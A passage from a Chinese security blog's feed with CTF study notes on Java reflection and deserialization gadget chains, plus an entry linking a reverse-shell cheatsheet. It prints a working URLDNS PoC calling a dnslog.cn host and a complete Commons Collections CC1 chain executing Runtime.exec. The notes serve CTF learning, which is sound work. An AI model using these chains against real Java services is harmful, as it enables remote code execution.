class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">//c.newInstance(); --&gt; 这个实例化对象是不能传参的</span></span><br><span class="line">        c.getConstructor();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        <span class="comment">//System.out.println(p);</span></span><br><span class="line">        <span class="comment">//获取类里面属性</span></span><br><span class="line">        <span class="comment">//Field[] personfiled = c.getFields(); //这个函数的话只可以获取公有属性，私有的不行</span></span><br><span class="line"><span class="comment">//        Field[] personfiled = c.getDeclaredFields();  //私有和公有都能获取</span></span><br><span class="line"><span class="comment">//        for(Field f:personfiled)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//          System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125; 这些都是数组</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>); <span class="comment">//getField  和  getDeclaredFields都不能修改里边的值，因为是私有属性</span></span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);  <span class="comment">//这是允许修改私有属性的值</span></span><br><span class="line">        namefield.set(p,<span class="number">23</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethod = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m:personmethod)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125; 查看这个类里</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);<span class="comment">//如果把person类里边的action函数换成private,那就etDeclaredMethod,然后通过setAccessible(true);修改权限</span></span><br><span class="line">            actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            actionmethod.invoke(p,<span class="string">&quot;ggaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>学习中用到的代码</strong>(URLDNS的poc)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3rzcpr.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要jdk8 来进行运行</p><p><a href="https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C%EF%BC%9AJava%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java%20Reflection%EF%BC%89.md">github上反射的详细文章</a></p><p><strong>这里的知识点对应着web846</strong>   payload可以去看羽师傅写的博客</p><h2 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h2><p>jdk动态代理</p><p><a href="https://zhuanlan.zhihu.com/p/567962124">文章</a>   这里就不多写了，  因为这篇文章已经写的很清楚了    </p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=3&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频</a>  这里的话是讲的很明白了  这里有很多都是套路写法</p><h3 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h3><p>视频讲解   <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p><strong>cc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import jdk.internal.org.objectweb.asm.commons.Method;</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> sun.invoke.anon.AnonymousClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Object.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//简单弹个计算器</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//用反射弹个计算器</span></span><br><span class="line">        <span class="comment">// Runtime r = Runtime.getRuntime(); 这个不能进行序列化操作，所以我们得通过反射进行操作</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//利用 InvokerTransformer弹个计算器</span></span><br><span class="line">        <span class="comment">//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;key&quot;,&quot;value&quot;);  //写这里的原因是为了下面的遍历</span></span><br><span class="line"><span class="comment">//        //利用Map.Entry的遍历通过setValue调用checkSetValue</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line">        <span class="comment">//entry.setValue(r);//给r的话，那么checkSetValue里的value值也是r，所以会弹出计算器</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//下面是写好的通过反射来调用Runtime.getEuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        //上面的代码是为了替代下面的1</span></span><br><span class="line"><span class="comment">//       Runtime r =(Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//       //上面的代码是为了替代下面的2</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"><span class="comment">//        //上面的代码是为了替代下面的3</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为上面的方法的话是对transform进行循环调用的，所以我们可以利用ChainedTransformer进行循环利用,这个函数的构造函数是传一个transform数组进去，然后对其循环调用</span></span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        chainedTransformer.transform(Runtime.class); <span class="comment">///这里的话是只有这个Runtime是由我们控制的,这里的话是只调用一次transform.</span></span><br><span class="line">            <span class="comment">//Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);//1</span></span><br><span class="line">            <span class="comment">//Runtime r =(Runtime) getRuntimeMethod.invoke(null,null);//2</span></span><br><span class="line">           <span class="comment">// Method execMethod = c.getMethod(&quot;exec&quot;, String[].class);//3</span></span><br><span class="line">            <span class="comment">//execMethod.invoke(r,&quot;calc&quot;);//3</span></span><br><span class="line"><span class="comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        //这因为AnnotationInvocationHandler没有定义为public，所以不能直接获取，得通过反射来进行获取</span></span><br><span class="line"><span class="comment">//        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationInvocationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationConstructor.newInstance(Override.class,transformedMap);</span></span><br><span class="line"><span class="comment">//        //上面的那个代码时替代上面那个for循环的setValue();  因为就是AnnotationInvocationHandler的readObject里面调用了setValue</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.最后 得重新搞  因为runtime不能进行序列化</span></span><br><span class="line">        <span class="comment">//2.AnnotationInvocationHandler里的readObject()处那调用的setValue()哪有两个if得进行绕过</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码时学习cc1时调试的代码，这里有一个坑就是得先跟着上面的视频进行调试，不然的话会复现不成功。</p><p>这里的话由于自己懒  所以用这篇文章来进行学习   <a href="https://www.cnblogs.com/LeslieSec/p/17112646.html">文章</a></p><p>（只是写一些我看的时候的见解）</p><p><img src="../images/image-20230308162258990.png" alt="image-20230308162258990"></p><p>这里虽然传了valueTransformer的值，但是</p><p><img src="../images/image-20230308162354429.png" alt="image-20230308162354429"></p><p>这个value没有传，所以跟进文章的下一步操作。</p><p><img src="../images/image-20230308163906186.png" alt="image-20230308163906186"></p><p>这里传transformedMap的原因是因为Map可控<img src="../images/image-20230308163951871.png" alt="image-20230308163951871"></p><p>transformedMap在这里的是因为得遍历然后触发setValue();</p><p>那两个if绕过的解释</p><p><img src="../images/image-20230308170126953.png" alt="image-20230308170126953"></p><p><img src="../images/image-20230308170141736.png" alt="image-20230308170141736"></p><p><code>memberValue.getValue();</code>  <code>memberTypes.get(name);</code>在map修改key名为value的时候，那么get(name)就会调用到Target的value从而能绕过判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memberType.isInstance(value)  这个的话绕过应该是因为constructor.newInstance(Target.class,transformedMap);这个实例化对象的时候传进来了Target,并且这个里面刚好有value</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//避免被readObject修改</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//第一个参数继承了注解，我们先用override尝试</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个poc链子的顺序就是  </p><p>InvokerTransformer  —&gt;  transformers   —&gt;  transformedMap  —&gt;  decorate  —&gt;checkSetValue  —&gt; setValue —&gt;  AnnotationInvocationHandler的readObject</p><p>这就是整条链子的顺序  里面最重要的方法就是<strong>反射</strong></p><h3 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;&lt;/a&gt;URLDNS&lt;/h2&gt;&lt;p&gt;java里的&lt;code&gt;implements&lt;/code&gt;和c++里的那个继承是一个意思，就是会继承前者里的</summary>
      
    
    
    
    
    <category term="ctfshow java反序列化" scheme="https://ke1nys.github.io/tags/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell</title>
    <link href="https://ke1nys.github.io/posts/2f610211.html"/>
    <id>https://ke1nys.github.io/posts/2f610211.html</id>
    <published>2023-02-24T10:43:53.000Z</published>
    <updated>2023-03-28T12:54:42.229Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk">反弹shell大合集</a></p><p>里面还有工具</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#aw</summary>
      
    
    
    
    
    <category term="反弹shell大全" scheme="https://ke1nys.github.io/tags/%E5%8F%8D%E5%BC%B9shell%E5%A4%A7%E5%85%A8/"/>
    
  </entry>
  
</feed>
